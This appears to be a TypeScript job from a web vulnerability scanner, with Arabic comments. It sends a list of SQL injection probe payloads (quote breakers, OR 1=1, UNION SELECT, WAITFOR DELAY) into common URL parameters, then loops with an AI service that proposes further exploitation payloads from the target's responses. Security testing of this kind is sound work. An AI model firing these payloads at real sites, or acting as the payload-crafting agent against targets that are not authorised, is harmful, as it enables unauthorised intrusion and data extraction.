// backend/src/worker/jobs/sqli/vector1-in-band.ts (النسخة النهائية مع حواس معززة)

import { Job } from 'bullmq';
import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
import { startSqliExploitationChat, getNextSqlPayload } from '../../services/ai';
import { ALL_SQL_ERROR_SIGNATURES } from './signatures';
import { executeRequest, delay, COMMON_FALLBACK_PARAMS, recordVulnerability, MAX_ATTEMPTS_PER_PARAM } from './common';
import { URL } from 'url';

const INTELLIGENCE_PROBE_PAYLOADS = [
    "'", "\"", "`", "\\", "1'", "1\"", "1'\"", // أحرف كسر بناء الجملة
    "1' OR '1'='1", "1' AND 1=1", "1' OR 1=1--", // منطق بسيط
    "1' UNION SELECT NULL--", "1' UNION SELECT 1,2,3--", // اختبار UNION
    "1' AND (SELECT * FROM nonexistent_table) IS NULL--", // اختبار وجود جدول
    "1' AND 1=CAST(1 AS int)--", // اختبار تحويل الأنواع
    "1' AND 1=1; --", "1' WAITFOR DELAY '0:0:5'--", // اختبار الأوامر المكدسة البسيط
];

export async function executeInBandAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
    const { targetUrl, scanId } = job.data;
    console.log('[Vector 1] Starting In-Band (Error & UNION) Attack...');
    let foundVulnerability = false;

    // --- الحصول على خط الأساس للطول مرة واحدة في البداية ---
    let baselineLength = -1;
    try {
        const { responseBody } = await executeRequest(targetUrl);
        baselineLength = responseBody.length;
        console.log(`[Vector 1] Established baseline response length: ${baselineLength}`);
    } catch (e) {
        console.warn("[Vector 1] Could not establish a baseline response length.");
    }

    for (const param of COMMON_FALLBACK_PARAMS) {
        console.log(`\n[Vector 1] Testing Parameter: [${param}]`);

        // --- Phase 1: The Blitzkrieg (Automated Error-Based Scan) ---
        let quickWinFound = false;
        for (const payload of INTELLIGENCE_PROBE_PAYLOADS) {
            try {
                const testUrl = new URL(targetUrl);
                testUrl.searchParams.set(param, payload);
                const { responseBody } = await executeRequest(testUrl.toString());
                const foundSignature = ALL_SQL_ERROR_SIGNATURES.find(sig => responseBody.toLowerCase().includes(sig.toLowerCase()));
                if (foundSignature) {
                    console.log(`[Vector 1 - Blitzkrieg] ✅ Error-Based SQLi Confirmed with payload: "${payload}"`);
                    const proof = `Payload: ${payload}\nSignature Found: "${foundSignature}"\nURL: ${testUrl.toString()}`;
                    const description = `Error-Based In-Band SQLi in '${param}' detected.`;
                    await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.HIGH, description, proof);
                    quickWinFound = true;
                    foundVulnerability = true;
                    break;
                }
            } catch (error) { /* Ignore errors in this quick phase */ }
        }
        if (quickWinFound) continue;

        // --- Phase 2: The Grandmaster (Conversational AI Attack) ---
        console.log(`[Vector 1 - Grandmaster] Escalating to AI for deep scan on '${param}'...`);
        const chat = startSqliExploitationChat();
        let feedback = `Begin analysis on parameter '${param}'. Acknowledge your role and provide the first payload as instructed by your directives (Phase 1).`;
        let aiFinished = false;
        let attempts = 0;

        while (attempts < MAX_ATTEMPTS_PER_PARAM && !aiFinished) {
            attempts++;
            console.log(`\n[Vector 1 - Grandmaster Attempt #${attempts} on '${param}']`);

            if (attempts > 1) {
                console.log(`[Throttling] Waiting for 6 seconds...`);
                await delay(6000);
            }

            const { payload, reasoning, finished } = await getNextSqlPayload(chat, feedback);
            aiFinished = finished;
            console.log(`[AI Reasoning] ${reasoning}`);
            if (aiFinished || !payload) {
                console.log(`[AI decided to end attempt on param '${param}']`);
                break;
            }
            console.log(`[AI suggested payload: "${payload}"]`);

            try {
                const testUrl = new URL(targetUrl);
                testUrl.searchParams.set(param, payload);
                const { response, responseBody, responseTime } = await executeRequest(testUrl.toString());
                
                const errorSignature = ALL_SQL_ERROR_SIGNATURES.find(sig => responseBody.toLowerCase().includes(sig.toLowerCase()));

                // ✅✅✅ الإصلاح الحاسم: منطق التغذية الراجعة الذكي ✅✅✅
                let lengthChangeIndicator = '';
                // إذا كان لدينا خط أساس، ونحن نختبر ORDER BY، والطول تغير بشكل كبير (أصبح صغيراً جداً)
                if (baselineLength > 0 && payload.toUpperCase().includes('ORDER BY') && responseBody.length < baselineLength * 0.5) {
                    lengthChangeIndicator = ` Hint: The response length dropped significantly, suggesting ORDER BY may have failed.`;
                }

                feedback = `Target responded to '${payload}' with: Status=${response.status}, Time=${responseTime.toFixed(0)}ms, Length=${responseBody.length}, Error='${errorSignature || 'None'}.${lengthChangeIndicator}`;

                // منطق الكشف عن النجاح
                if (errorSignature || responseBody.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)|(root@localhost)|(@@version)/i)) {
                    console.log(`[Vector 1 - Grandmaster] ✅ AI-driven SQLi Confirmed!`);
                    const proof = `Payload: ${payload}\nAI Reasoning: ${reasoning}\nResponse Snippet: ${responseBody.substring(0, 200)}...`;
                    const description = `AI-driven In-Band SQLi in '${param}'. Vulnerability confirmed through conversational analysis.`;
                    await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.CRITICAL, description, proof);
                    foundVulnerability = true;
                    break;
                }
            } catch (error: any) {
                feedback = `Execution of '${payload}' failed with client-side error: ${error.message}. Suggest an alternative.`;
            }
        }
    }
    return foundVulnerability;
}
